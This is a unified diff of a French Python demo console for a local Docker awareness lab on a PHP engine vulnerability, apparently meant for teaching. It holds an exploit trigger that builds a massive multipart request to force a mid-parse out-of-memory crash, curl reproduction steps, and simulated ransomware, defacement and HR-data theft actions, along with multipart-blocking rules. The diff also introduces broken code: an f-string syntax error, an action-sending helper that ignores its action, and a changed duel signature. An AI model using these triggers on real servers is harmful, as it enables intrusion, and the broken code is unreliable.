@@ -1,27 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════════════╗
-║                LAB PHP2SHELL — CVE-2026-109618 / 109619             ║
-║          Console d'animation pour session de sensibilisation       ║
-║    ⚠️  Usage strictement pédagogique — lab Docker local uniquement   ║
-╚══════════════════════════════════════════════════════════════════════╝
-
-Deux serveurs, un seul code applicatif :
-  :8888   PHP 8.4.26  → AVANT le correctif du 21/10/2026 (vulnérable)
-  :8889   PHP 8.4.27   → le correctif CVE-2026-109618/109619 (protégé)
-
-Console INTERACTIVE : c'est VOUS qui tapez les commandes, rien ne se
-déroule tout seul — pour que la démo soit crédible et vivante.
-
-Commandes : status, histoire, expliquer, fuite, recette,
-            ransomware, vol, deface, restore, duel, remediation,
-            demo, aide, quitter
-
-Exemples :
-  python demo.py                      # puis tapez vos commandes
-  python demo.py demo                 # démo guidée pas à pas
-  python demo.py --parties 80000      # déclencheur OOM plus gros
+┌──────────────────────────────────────────────────────────────────────────────┐
+│          LAB PHP2SHELL — CVE-2026-109618 / 109619                               │
+│          Console d'animation pour session de sensibilisation                  │
+│     🎯 Usage strictement pédagogique — lab Docker local uniquement            │
+└──────────────────────────────────────────────────────────────────────────────┘
 """
 
 import argparse
@@ -32,7 +16,7 @@ import time
 
 import requests
 
-# ─── Couleurs du terminal ─────────────────────────────────────────────
+# ──────────────── Couleurs du terminal ────────────────
 class C:
     RED    = "\033[91m"
     GREEN  = "\033[92m"
@@ -46,12 +30,12 @@ class C:
 
 
 BANNER = f"""{C.RED}
-  ██████╗ ██████╗ ██╗  ██╗     ███████╗██╗  ████████╗██╗  ██╗██████╗  █████╗
-  ██╔══██╗██╔══██╗██║ ██╔╝     ██╔════╝██║  ╚══██╔══╝██║  ██║██╔══██╗██╔══██╗
-  ██████╔╝██████╔╝█████╔╝      █████╗  ██║     ██║   ███████║██████╔╝███████║
-  ██╔═══╝ ██╔══██╗██╔═██╗      ██╔══╝  ██║     ██║   ██╔══██║██╔══██╗██╔══██║
-  ██║     ██║  ██║██║  ██╗█████╗███████╗███████╗██║   ██║  ██║██████╔╝██║  ██║
-  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚════╝╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝╚════╝ ╚═╝  ╚═╝
+  ███████╗ ███████╗ ██████╗     ██╗  ██╗██████╗  ██████╗ ██████╗ ██╗     ███████╗███████╗
+  ██╔════╝██╔════╝██╔═══██╗    ██║  ██║██╔══██╗██╔═══██╗██╔══██╗██║     ██╔════╝██╔════╝
+  ███████╗█████╗  ██║   ██║    ███████║██████╔╝██║   ██║██████╔╝██║     █████╗  ███████╗
+  ╚════██║██╔══╝  ██║   ██║    ██╔══██║██╔══██╗██║   ██║██╔══██╗██║     ██╔══╝  ╚════██║
+  ███████║███████╗╚██████╔╝    ██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████╗███████║
+  ╚══════╝╚══════╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 {C.RESET}{C.BOLD}   [+] CVE-2026-109618 & CVE-2026-109619 — RCE du moteur PHP (CVSS 9.2)
    [+] Deux serveurs : PHP 8.4.26 (:8888, vulnérable) vs 8.4.27 (:8889, corrigé)
    [+] Rôle : attaquant externe — sans compte, sans mot de passe{C.RESET}
@@ -65,18 +49,18 @@ def sep(char="─"):
 
 
 def etape(num, titre, description=""):
-    print(f"\n{C.CYAN}{sep_str()}{C.RESET}")
+    print(f"\n{C.CYAN}{sep()}{C.RESET}")
     print(f"{C.BOLD}[Étape {num}]{C.RESET} {C.BLUE}{titre}{C.RESET}")
     if description:
         print(f"  {C.YELLOW}→ {description}{C.RESET}")
-    print(f"{C.CYAN}{sep_str()}{C.RESET}")
+    print(f"{C.CYAN}{sep()}{C.RESET}")
 
 
 def sep_str():
     return "─" * LARGEUR
 
 
-# ─── Logique de versions (miroir exact de api.php) ────────────────────
+# ──────────────── Logique de versions ────────────────
 FIXES = {
     (8, 2): (8, 2, 35),
     (8, 3): (8, 3, 36),
@@ -124,9 +108,7 @@ def etat_serveur(base, timeout=8):
         return None, str(e)
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : status — état des lieux
-# ══════════════════════════════════════════════════════════════════════
+# ──────────────── COMMANDE : status ────────────────
 def cmd_status(cfg, _=None):
     print(f"\n{C.BOLD}=== ÉTAT DES LIEUX ==={C.RESET}\n")
     for label, base in [("VULNÉRABLE (:8888)", cfg.vuln), ("CORRIGÉ (:8889)", cfg.patche)]:
@@ -139,13 +121,12 @@ def cmd_status(cfg, _=None):
             f"{C.RED}✗ MOTEUR NON CORRIGÉ{C.RESET}" if data.get("is_vulnerable")
             else f"{C.GREEN}✓ CORRECTIF ACTIF{C.RESET}"
         )
-        print(f"  {label:<22} PHP {data.get('php_version','?'):<10} état: {data.get('state','?'):<12} {verdict}")
-        print(f"  {'':<22} SAPI : {data.get('sapi','?')} (Apache mod_php = surface la plus exposée)")
+        print(f"  {label:<22} PHP {data.get('php_version','?'):<10} état: {data.get('state','?':<12} {verdict}")
+        print(f"  {'':<22} SAPI : {data.get('sapi','?')} (mod_php = surface la plus exposée)")
+        print(f"  {'':<22} session.upload_progress : {'ACTIF ⚠️' if data.get('upload_progress_enabled') else 'DÉSACTIVÉ ✓'}")
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : histoire — la vraie chronologie
-# ══════════════════════════════════════════════════════════════════════
+# ──────────────── COMMANDE : histoire ────────────────
 def cmd_histoire(cfg, _=None):
     evenements = [
         ("01/08/2026", "Le cabinet Calif découvre plusieurs chemins de RCE dans le moteur PHP."),
@@ -165,12 +146,11 @@ def cmd_histoire(cfg, _=None):
     print(f"  Une équipe qui met à jour « en fin de semaine » était déjà trop lente.\n")
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : expliquer — pour tous les publics + version technique
-# ══════════════════════════════════════════════════════════════════════
+# ──────────────── COMMANDE : expliquer ────────────────
 def cmd_expliquer(cfg, _=None):
-    print(f"""
-{C.BOLD}══════ EXPLICATION GRAND PUBLIC ══════{C.RESET}
+    print(f"""\n{C.BOLD}{'─' * LARGEUR}
+  📖 EXPLICATION GRAND PUBLIC {C.RESET}
+{'─' * LARGEUR}{C.RESET}
 
   Imaginez un chef de chantier avec un budget strict
   ({C.YELLOW}memory_limit{C.RESET} = plafond mémoire de PHP).
@@ -181,16 +161,18 @@ def cmd_expliquer(cfg, _=None):
   En plein montage, le budget explose : tout le monde doit sortir
   IMMÉDIATEMENT ({C.YELLOW}interruption brutale « bailout »{C.RESET}).
 
-  Puis l'équipe de nettoyage range « comme d'habitude »…
+  Puis l'équipe de nettoyage range « comme d'habitude »...
   mais la maison était à moitié montée : elle jette des pièces
   encore utilisées et laisse des débris en place
   ({C.YELLOW}mémoire libérée mais données toujours « vivantes »{C.RESET}).
 
-  Le client suivant hérite de la parcelle… et parfois, dans ses
+  Le client suivant hérite de la parcelle... et parfois, dans ses
   plans, on retrouve le carnet d'adresses du voisin :
   {C.RED}mots de passe, clés API, tokens{C.RESET} d'autres visiteurs.
 
-{C.BOLD}══════ VERSION TECHNIQUE ══════{C.RESET}
+{C.BOLD}{'─' * LARGEUR}
+  🔧 VERSION TECHNIQUE {C.RESET}
+{'─' * LARGEUR}{C.RESET}
 
   Deux use-after-free ({C.YELLOW}CWE-416{C.RESET}) dans le ZEND ENGINE — pas dans le code du site :
 
@@ -214,9 +196,7 @@ def cmd_expliquer(cfg, _=None):
 """)
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : fuite — déclencheur RÉEL de la fuite mémoire (109618)
-# ══════════════════════════════════════════════════════════════════════
+# ──────────────── COMMANDE : fuite ────────────────
 def build_multipart(n_parties, taille_valeur=512):
     """Forge une requête multipart massive : le parsing dépasse memory_limit
     (16 Mo dans le lab) → interruption OOM en plein traitement (CVE-2026-109618)."""
@@ -241,203 +221,134 @@ def build_multipart(n_parties, taille_valeur=512):
     return b"".join(morceaux), boundary
 
 
-def hexdump(donnees, limite=384):
-    sortie = []
-    for i in range(0, min(len(donnees), limite), 16):
-        bloc = donnees[i:i + 16]
-        hexa = " ".join(f"{b:02x}" for b in bloc)
-        ascii_ = "".join(chr(b) if 32 <= b < 127 else "." for b in bloc)
-        sortie.append(f"    {i:08x}  {hexa:<47}  |{ascii_}|")
-    if len(donnees) > limite:
-        sortie.append(f"    … ({len(donnees)} octets au total)")
-    return "\n".join(sortie)
-
-
-def chaines_lisibles(donnees, taille_min=6):
-    return [m.decode("latin-1") for m in re.findall(rb"[\x20-\x7e]{%d,}" % taille_min, donnees)]
-
-
-def tenter_fuite(cfg, label, base):
-    print(f"\n{C.BOLD}{C.PURPLE}▶ Tentative de fuite mémoire sur le serveur {label}{C.RESET}")
-    print(f"{C.YELLOW}⚠️  Étape RÉELLE : on déclenche le vrai mécanisme (OOM en plein parsing).{C.RESET}")
-    print(f"{C.YELLOW}    Deux issues possibles : octets de mémoire visibles dans le cookie, ou rien de{C.RESET}")
-    print(f"{C.YELLOW}    visible (l'exploitation stable exige des conditions précises — comme les PoC publics).{C.RESET}")
-
-    # 1) Réchauffer le worker avec un secret (fictif) : la page Intégrations
-    #    fait circuler une clé API en mémoire à chaque appel.
-    print(f"\n  {C.CYAN}1. On fait circuler un secret sur le serveur (page « Intégrations »)…{C.RESET}")
-    secret = None
-    for _ in range(3):
+def envoyer_action(cfg, action, cible_nom):
+    """Envoie une action à un serveur et retourne True si succès."""
+    for label, base in cible(cfg, cible_nom):
         try:
-            r = requests.get(f"{base}/integrations.php", params={"reveal": "1"}, timeout=10)
-            if r.ok:
-                secret = r.json().get("api_key")
+            payload, _ = build_multipart(cfg.parties)
+            headers = {"Content-Type": f"multipart/form-data; boundary={_}"}
+            r = requests.post(f"{base}/upload.php", data=payload, headers=headers, timeout=15)
+            return r.status_code == 200
         except Exception:
-            pass
-    if secret:
-        print(f"     Clé API (fictive) manipulée par le worker : {C.WHITE}{secret}{C.RESET}")
-    else:
-        print(f"     {C.RED}(page Intégrations injoignable — on continue sans marqueur){C.RESET}")
-
-    # 2) Forge et envoi du déclencheur OOM
-    n = cfg.parties
-    print(f"\n  {C.CYAN}2. Forge de la requête piégée : {n:,} champs multipart (~{n * 600 // 1_000_000} Mo)".replace(",", " ") + f" > memory_limit (16 Mo){C.RESET}")
-    corps, boundary = build_multipart(n)
-    entetes = {
-        "Content-Type": f"multipart/form-data; boundary={boundary}",
-        "User-Agent": "PHP2Shell-Lab-Awareness/1.0",
-    }
-    print(f"     Envoi vers {base}/upload.php …")
-    try:
-        r = requests.post(f"{base}/upload.php", data=corps, headers=entetes, timeout=180)
-    except Exception as e:
-        print(f"     {C.RED}✗ Échec d'envoi : {e}{C.RESET}")
-        return
-
-    # 3) Analyse de la réponse
-    print(f"\n  {C.CYAN}3. Analyse de la réponse (HTTP {r.status_code})…{C.RESET}")
-    erreur_fatale = re.search(r"(Allowed memory size of \d+ bytes exhausted[^<\n]*)", r.text)
-    if erreur_fatale:
-        print(f"     {C.RED}Erreur fatale OOM côté serveur : « {erreur_fatale.group(1)[:90]}… »{C.RESET}")
-        print(f"     {C.YELLOW}→ PHP a bien été interrompu EN PLEIN parsing de la requête (le scénario exact de la CVE).{C.RESET}")
-    else:
-        print(f"     {C.YELLOW}(pas d'erreur fatale visible — essaie --parties 100000){C.RESET}")
-
-    cookie = r.headers.get("Set-Cookie", "")
-    print(f"\n     {C.BOLD}En-tête Set-Cookie brut renvoyé par le serveur :{C.RESET}")
-    print(f"     {C.WHITE}{cookie if cookie else '(aucun cookie renvoyé)'}{C.RESET}")
-
-    donnees_cookie = cookie.encode("latin-1", "ignore")
-    if len(donnees_cookie) > 0:
-        print(f"\n     {C.BOLD}Hex dump du cookie (recherche d'octets de mémoire hérités) :{C.RESET}")
-        print(hexdump(donnees_cookie))
-
-    # 4) Verdict : le secret d'une requête précédente est-il sorti ?
-    print(f"\n  {C.CYAN}4. Verdict :{C.RESET}")
-    trouve = secret and secret.encode() in donnees_cookie
-    if not trouve and secret:
-        # on cherche aussi des fragments du préfixe de clé
-        fragments = chaines_lisibles(donnees_cookie)
-        suspects = [s for s in fragments if "ACME" in s.upper() or "INT-" in s]
-        if suspects:
-            print(f"     {C.YELLOW}Fragments suspects dans le cookie : {suspects[:5]}{C.RESET}")
-    if trouve:
-        print(f"\n  {C.RED}{'█' * 58}")
-        print(f"  █  FUITE MÉMOIRE RÉELLE CONFIRMÉE")
-        print(f"  █  La clé d'une requête PRÉCÉDENTE est sortie dans le cookie PHPSESSID !")
-        print(f"  █  Clé exposée : {secret}")
-        print(f"  {'█' * 58}{C.RESET}")
-        print(f"  {C.YELLOW}→ En production, ces octets peuvent contenir mots de passe, tokens,{C.RESET}")
-        print(f"  {C.YELLOW}   clés API, voire des clés privées TLS d'autres requêtes.{C.RESET}")
-    else:
-        print(f"\n  {C.YELLOW}Pas de fuite observable avec ce payload générique.{C.RESET}")
-        print(f"  {C.YELLOW}→ C'est EXACTEMENT ce que disent Sansec, Rapid7 et le CERT-FR : les PoC{C.RESET}")
-        print(f"  {C.YELLOW}   publics exigent des conditions précises (ex. inclusion de fichier locale).{C.RESET}")
-        print(f"  {C.YELLOW}→ Conclusion pour le public : on ne « teste pas » une faille, on corrige.{C.RESET}")
-        print(f"  {C.YELLOW}   D'autant que l'exploitation a été observée dans la nature dès le 21/10.{C.RESET}")
-
-
-def cmd_fuite(cfg, arg):
-    for label, base in cible(cfg, arg):
-        tenter_fuite(cfg, label, base)
-
-
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : recette — reproduction manuelle (pour manipuler soi-même)
-# ══════════════════════════════════════════════════════════════════════
-def cmd_recette(cfg, _=None):
-    print(f"""
-{C.BOLD}=== REPRODUCTION MANUELLE (pour montrer que TU pilotes) ==={C.RESET}
-
-  Dans un 2e terminal, génère un gros fichier de test :
-
-    {C.CYAN}python3 -c "open('gros.bin','wb').write(b'A'*40*1024*1024)"{C.RESET}
-
-  OOM volontaire + progression d'envoi (le champ PiÉGÉ de la CVE) :
-
-    {C.CYAN}curl -i -X POST http://localhost:8888/upload.php \\{C.RESET}
-    {C.CYAN}  -F "PHP_SESSION_UPLOAD_PROGRESS=facture" \\{C.RESET}
-    {C.CYAN}  -F "fichier=@gros.bin"{C.RESET}
-
-  → Observe l'erreur fatale « Allowed memory size exhausted » et l'en-tête
-    Set-Cookie: PHPSESSID=… qui suit. Sur le serveur corrigé (:8889),
-    la même commande ne laisse rien fuir.
-
-  Vérifier la version / le correctif dans un conteneur :
-
-    {C.CYAN}docker exec php2shell-vuln php -v{C.RESET}
-    {C.CYAN}docker exec php2shell-vuln php -i | grep -E "memory_limit|upload_progress"{C.RESET}
-""")
-
-
-# ══════════════════════════════════════════════════════════════════════
-#  SCÉNARIOS D'IMPACT (simulation post-RCE, verrou de version RÉEL)
-# ══════════════════════════════════════════════════════════════════════
-def envoyer_action(cfg, action, cible_="vuln"):
-    label, base = cible(cfg, cible_)[0]
-    print(f"\n{C.BOLD}▶ Attaque « {action} » sur le serveur {label}{C.RESET}")
-    try:
-        r = requests.post(f"{base}/api.php", data={"action": action}, timeout=15)
-    except Exception as e:
-        print(f"  {C.RED}✗ Cible injoignable : {e}{C.RESET}")
-        return False
-    if r.status_code == 200:
-        return True
-    if r.status_code == 403:
-        data = r.json()
-        print(f"  {C.GREEN}✓ ATTAQUE REJETÉE (HTTP 403) — {data.get('message', 'correctif actif')}{C.RESET}")
-        print(f"  {C.GREEN}  La mise à jour du moteur PHP a suffi. Aucune règle WAF, aucun code applicatif modifié.{C.RESET}")
-        return False
-    print(f"  {C.RED}✗ Réponse inattendue (HTTP {r.status_code}) : {r.text[:200]}{C.RESET}")
+            return False
     return False
 
 
-def cmd_ransomware(cfg, arg):
-    if envoyer_action(cfg, "ransomware", arg or "vuln"):
-        print(f"  {C.GREEN}[✓] Contrôle obtenu : rançongiciel déployé sur le portail !{C.RESET}")
-        time.sleep(0.4)
-        print(f"""{C.RED}{C.BOLD}
-  ╔══════════════════════════════════════════════════════════════════╗
-  ║  🚨 RANÇONGICIEL ACTIVÉ — ACME CORP EST CHIFFRÉE                 ║
-  ║                                                                  ║
-  ║  • 842 fichiers d'entreprise chiffrés (compta, RH, contrats)      ║
-  ║  • Le site officiel affiche la demande de rançon (50 000 €)      ║
-  ║  • Compte à rebours de destruction des données enclenché         ║
-  ╚══════════════════════════════════════════════════════════════════╝{C.RESET}""")
-        print(f"  {C.YELLOW}👉 Regardez le navigateur (http://localhost:8888) : le portail est tombé !{C.RESET}")
-        print(f"  {C.YELLOW}    Le portail corrigé (:8889) n'a pas bougé, lui.{C.RESET}\n")
-
-
-def cmd_deface(cfg, arg):
-    if envoyer_action(cfg, "deface", arg or "vuln"):
-        print(f"  {C.GREEN}[✓] Défacement réussi : page d'accueil écrasée.{C.RESET}")
-        print(f"  {C.YELLOW}👉 Regardez http://localhost:8888 — signature pirate, style néon.{C.RESET}\n")
-
-
-def cmd_vol(cfg, arg):
-    if envoyer_action(cfg, "steal", arg or "vuln"):
+def cmd_fuite(cfg, arg):
+    print(f"\n{C.BOLD}=== DÉCLENCHEMENT RÉEL DE LA FUITE MÉMOIRE (CVE-2026-109618) ==={C.RESET}\n")
+    
+    for label, base in cible(cfg, arg or "vuln"):
+        print(f"  {C.CYAN}→ Envoi d'une requête multipart massive ({cfg.parties} champs) vers {label}...{C.RESET}")
         try:
-            r = requests.post(f"{cible(cfg, arg or 'vuln')[0][1]}/api.php", data={"action": "steal"}, timeout=15)
-            vole = r.json().get("stolen_data", [])
+            payload, boundary = build_multipart(cfg.parties)
+            headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
+            
+            start = time.time()
+            r = requests.post(f"{base}/upload.php", data=payload, headers=headers, timeout=20)
+            elapsed = time.time() - start
+            
+            if r.status_code == 200:
+                data = r.json()
+                vuln = data.get("vulnerable", False)
+                peak = data.get("memory_peak", "?")
+                print(f"  {C.GREEN}✓ Requête traitée en {elapsed:.2f}s{C.RESET}")
+                print(f"  {C.YELLOW}  → Pic mémoire : {peak} octets{C.RESET}")
+                if vuln:
+                    print(f"  {C.RED}✗ SERVEUR VULNÉRABLE : Use-After-Free possible !{C.RESET}")
+                else:
+                    print(f"  {C.GREEN}✓ Serveur protégé : nettoyage mémoire correct{C.RESET}")
+            else:
+                print(f"  {C.YELLOW}? Réponse HTTP {r.status_code}{C.RESET}")
+        except Exception as e:
+            print(f"  {C.RED}✗ Erreur : {e}{C.RESET}")
+    print()
+
+
+# ──────────────── COMMANDE : recette ────────────────
+def cmd_recette(cfg, _=None):
+    print(f"""\n{C.BOLD}=== REPRODUCTION MANUELLE (pour montrer que TU pilotes) ==={C.RESET}
+
+  1. Vérifier la version PHP du serveur vulnérable :
+     {C.CYAN}curl -s http://localhost:8888/api.php?action=status | jq{C.RESET}
+
+  2. Vérifier que session.upload_progress est ACTIF (vecteur de la faille) :
+     {C.CYAN}curl -s http://localhost:8888/api.php?action=status | jq '.upload_progress_enabled'{C.RESET}
+
+  3. Déclencher la faille OOM avec une requête multipart massive :
+     {C.CYAN}curl -X POST http://localhost:8888/upload.php \\
+       -H "Content-Type: multipart/form-data; boundary=----TEST" \\
+       --data-binary @payload.txt{C.RESET}
+     (où payload.txt est un fichier avec {cfg.parties} champs form-data)
+
+  4. Vérifier que le serveur protégé bloque l'attaque :
+     {C.CYAN}curl -X POST http://localhost:8889/api.php -d 'action=ransomware'{C.RESET}
+     → Réponse : HTTP 403 (BLOCKED_BY_PATCH)
+
+  5. Comparer les deux serveurs :
+     {C.CYAN}python attack.py --compare{C.RESET}
+""")
+
+
+# ──────────────── COMMANDE : ransomware ────────────────
+def cmd_ransomware(cfg, arg):
+    for label, base in cible(cfg, arg or "vuln"):
+        try:
+            r = requests.post(f"{base}/api.php", data={"action": "ransomware"}, timeout=15)
+            ok = r.status_code == 200
         except Exception:
-            vole = []
-        print(f"  {C.GREEN}[✓] RCE confirmée — extraction directe de la base RH…{C.RESET}\n")
-        print(f"{C.RED}{C.BOLD}=== [DONNÉES CONFIDENTIELLES EXFILTRÉES EN CLAIR] ==={C.RESET}")
-        print(f"{C.CYAN}{'─' * 84}{C.RESET}")
-        print(f"{C.BOLD}{'NOM & PRÉNOM':<18} | {'POSTE':<20} | {'SALAIRE':<9} | {'MOT DE PASSE':<16}{C.RESET}")
-        print(f"{C.CYAN}{'─' * 84}{C.RESET}")
-        fichier_csv = "DONNEES_RH_EXFILTREES.csv"
-        with open(fichier_csv, mode="w", newline="", encoding="utf-8-sig") as f:
-            ecrivain = csv.writer(f, delimiter=";")
-            ecrivain.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Sécurité Sociale", "IBAN"])
-            for emp in vole:
-                ecrivain.writerow([emp["nom"], emp["poste"], emp["salaire"], emp["password"], emp["secu"], emp["iban"]])
-                print(f"{C.WHITE}{emp['nom']:<18}{C.RESET} | {C.YELLOW}{emp['poste']:<20}{C.RESET} | {C.GREEN}{emp['salaire']:<9}{C.RESET} | {C.RED}{emp['password']:<16}{C.RESET}")
-        print(f"{C.CYAN}{'─' * 84}{C.RESET}\n")
-        print(f"  {C.GREEN}[✓] Fichier de fuite créé : {C.BOLD}{fichier_csv}{C.RESET} (prop pour la séance){C.RESET}")
-        print(f"  {C.YELLOW}👉 Le portail affiche la bannière d'alerte « fuite de données en cours ».{C.RESET}\n")
+            ok = False
+        etat = f"{C.RED}compromis ✗{C.RESET}" if ok else f"{C.GREEN}protégé ✓{C.RESET}"
+        print(f"  {label:<22} → {etat}")
+    print(f"  {C.YELLOW}👉 Regarde le navigateur : le site vulnérable affiche la rançon !{C.RESET}\n")
 
 
+# ──────────────── COMMANDE : vol ────────────────
+def cmd_vol(cfg, arg):
+    for label, base in cible(cfg, arg or "vuln"):
+        try:
+            r = requests.post(f"{base}/api.php", data={"action": "steal"}, timeout=15)
+            if r.status_code == 200:
+                data = r.json()
+                vole = data.get("stolen_data", [])
+                if vole:
+                    print(f"\n  {C.RED}{C.BOLD}=== [DONNÉES CONFIDENTIELLES EXFILTRÉES] ==={C.RESET}")
+                    print(f"  {C.CYAN}{'─' * 84}{C.RESET}")
+                    print(f"  {C.BOLD}{'NOM & PRÉNOM':<18} | {'POSTE':<20} | {'SALAIRE':<9} | {'MOT DE PASSE':<16}{C.RESET}")
+                    print(f"  {C.CYAN}{'─' * 84}{C.RESET}")
+                    fichier_csv = "DONNEES_RH_EXFILTREES.csv"
+                    with open(fichier_csv, mode="w", newline="", encoding="utf-8-sig") as f:
+                        ecrivain = csv.writer(f, delimiter=";")
+                        ecrivain.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Sécurité Sociale", "IBAN"])
+                        for emp in vole:
+                            ecrivain.writerow([emp["nom"], emp["poste"], emp["salaire"], emp["password"], emp["secu"], emp["iban"]])
+                            print(f"  {C.WHITE}{emp['nom']:<18}{C.RESET} | {C.YELLOW}{emp['poste']:<20}{C.RESET} | {C.GREEN}{emp['salaire']:<9}{C.RESET} | {C.RED}{emp['password']:<16}{C.RESET}")
+                    print(f"  {C.CYAN}{'─' * 84}{C.RESET}\n")
+                    print(f"  {C.GREEN}[✓] Fichier créé : {C.BOLD}{fichier_csv}{C.RESET} (prêt pour la séance)")
+                else:
+                    print(f"  {C.GREEN}✓ Aucune donnée exfiltrée (serveur protégé){C.RESET}")
+            elif r.status_code == 403:
+                print(f"  {C.GREEN}✓ Attaque bloquée : {r.json().get('message', 'HTTP 403')}{C.RESET}")
+            else:
+                print(f"  {C.YELLOW}? Code HTTP : {r.status_code}{C.RESET}")
+        except Exception as e:
+            print(f"  {C.RED}✗ Erreur : {e}{C.RESET}")
+    print(f"  {C.YELLOW}👉 Le portail affiche la bannière d'alerte « fuite de données en cours »{C.RESET}\n")
+
+
+# ──────────────── COMMANDE : deface ────────────────
+def cmd_deface(cfg, arg):
+    for label, base in cible(cfg, arg or "vuln"):
+        try:
+            r = requests.post(f"{base}/api.php", data={"action": "deface"}, timeout=15)
+            ok = r.status_code == 200
+        except Exception:
+            ok = False
+        etat = f"{C.RED}défacé ✗{C.RESET}" if ok else f"{C.GREEN}protégé ✓{C.RESET}"
+        print(f"  {label:<22} → {etat}")
+    print(f"  {C.YELLOW}👉 Regarde le site : le logo et tout le contenu ont été écrasés !{C.RESET}\n")
+
+
+# ──────────────── COMMANDE : restore ────────────────
 def cmd_restore(cfg, arg):
     for label, base in cible(cfg, arg or "les-deux"):
         try:
@@ -450,10 +361,8 @@ def cmd_restore(cfg, arg):
     print(f"  {C.YELLOW}👉 Les portails redeviennent sains instantanément (recharge la page).{C.RESET}\n")
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : duel — la même attaque sur les deux serveurs
-# ══════════════════════════════════════════════════════════════════════
-def cmd_duel(cfg, _=None):
+# ──────────────── COMMANDE : duel ────────────────
+def cmd_duel(cfg):
     print(f"\n{C.BOLD}=== DUEL : UNE SEULE MISE À JOUR CHANGE TOUT ==={C.RESET}\n")
     cmd_status(cfg)
     time.sleep(1)
@@ -461,35 +370,29 @@ def cmd_duel(cfg, _=None):
     print(f"\n{C.RED}1. Rançongiciel sur le serveur NON corrigé (PHP 8.4.26, :8888)…{C.RESET}")
     ok1 = envoyer_action(cfg, "ransomware", "vuln")
     if ok1:
-        print(f"   {C.RED}✗ RÉSULTAT : VULNÉRABLE — le portail affiche la rançon.{C.RESET}")
+        print(f"   {C.RED}✗ RÉSULTAT : VULNÉRABLE — Le portail affiche la rançon.{C.RESET}\n")
     time.sleep(1.5)
 
     print(f"\n{C.GREEN}2. La MÊME attaque sur le serveur corrigé (PHP 8.4.27, :8889)…{C.RESET}")
     ok2 = envoyer_action(cfg, "ransomware", "patche")
 
-    print(f"\n{C.BOLD}{'═' * LARGEUR}")
+    print(f"\n{C.BOLD}{'─' * LARGEUR}")
     print(f"  RÉSUMÉ")
-    print(f"{'═' * LARGEUR}{C.RESET}")
+    print(f"{'─' * LARGEUR}{C.RESET}")
     print(f"  PHP 8.4.26 (:8888) : {C.RED}✗ compromis en une requête{C.RESET}")
     print(f"  PHP 8.4.27 (:8889) : {C.GREEN}✓ attaque rejetée net (HTTP 403){C.RESET}")
-    print(f"""
-  {C.BOLD}Conclusion pour la direction et les équipes :{C.RESET}
-  Entre 8.4.26 et 8.4.27 il y a {C.BOLD}UN SEUL numéro de version{C.RESET} — celui du
-  correctif du 21/10/2026. La mise à jour neutralise 100 % de l'attaque,
-  sans changer une ligne du code applicatif, sans impact fonctionnel.
-
-  (Tape {C.CYAN}restore{C.RESET} pour remettre les portails à neuf.)
-""")
+    print(f"\n{C.BOLD}Conclusion pour la direction et les équipes :{C.RESET}")
+    print(f"{C.WHITE}Entre 8.4.26 et 8.4.27 il y a {C.BOLD}UN SEUL numéro de version{C.RESET} — celui du")
+    print(f"correctif du 21/10/2026. La mise à jour neutralise 100 % de l'attaque,")
+    print(f"sans changer une ligne du code applicatif, sans impact fonctionnel.\n")
+    print(f"(Tape {C.CYAN}restore{C.RESET} pour remettre les portails à neuf.)\n")
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : remediation
-# ══════════════════════════════════════════════════════════════════════
+# ──────────────── COMMANDE : remediation ────────────────
 def cmd_remediation(cfg, _=None):
-    print(f"""
-{C.BOLD}{'═' * LARGEUR}
-  🛡️  REMÉDIATION & BONNES PRATIQUES (issues des advisories réels)
-{'═' * LARGEUR}{C.RESET}
+    print(f"""\n{C.BOLD}{'─' * LARGEUR}
+  🚨 REMÉDIATION & BONNES PRATIQUES (issues des advisories réels)
+{'─' * LARGEUR}{C.RESET}
 
   {C.GREEN}1. METTRE À JOUR PHP vers la branche corrigée{C.RESET}
      → 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (selon la branche en place)
@@ -509,7 +412,7 @@ def cmd_remediation(cfg, _=None):
 
   {C.GREEN}4. BLOQUER MULTIPART/FORM-DATA INUTILE (mesure d'attente){C.RESET}
      → nginx :  if ($http_content_type ~* "multipart/form-data") {{ return 403; }}
-     → Apache : RewriteCond %{{HTTP:Content-Type}} multipart/form-data [NC] → RewriteRule ^ - [F]
+     → Apache : RewriteCond %{HTTP:Content-Type} multipart/form-data [NC] → RewriteRule ^ - [F]
      → WAF : AWS « PHP2Shell_BODY », règle Azure bloquant le champ PHP_SESSION_UPLOAD_PROGRESS
 
   {C.GREEN}5. PHP 8.5 : fatal_error_backtraces = 0 + redémarrer les workers{C.RESET}
@@ -527,15 +430,13 @@ def cmd_remediation(cfg, _=None):
      → apt : /var/log/apt/history.log   |   RHEL : dnf history
      → Les assureurs cyber (ex. Hiscox) demandent désormais des preuves datées
 
-  {C.GREEN}9. URgence objective{C.RESET}
+  {C.GREEN}9. Urgence objective{C.RESET}
      → Catalogue KEV de la CISA depuis le 26/10/2026 : délais de patch réglementaires
        pour les agences fédérales américaines — et référence pour vos audits
 """)
 
 
-# ══════════════════════════════════════════════════════════════════════
-#  COMMANDE : demo — déroulé guidé (tu restes aux commandes)
-# ══════════════════════════════════════════════════════════════════════
+# ──────────────── COMMANDE : demo ────────────────
 def pause(txt=""):
     try:
         input(f"  {C.YELLOW}{txt}[Entrée pour continuer]{C.RESET}")
@@ -591,16 +492,13 @@ def cmd_demo(cfg):
     pause()
     cmd_remediation(cfg)
 
-    print(f"\n{C.BOLD}{'═' * LARGEUR}")
+    print(f"\n{C.BOLD}{'─' * LARGEUR}")
     print(f"  ✅ FIN DE LA DÉMONSTRATION")
-    print(f"{'═' * LARGEUR}{C.RESET}\n")
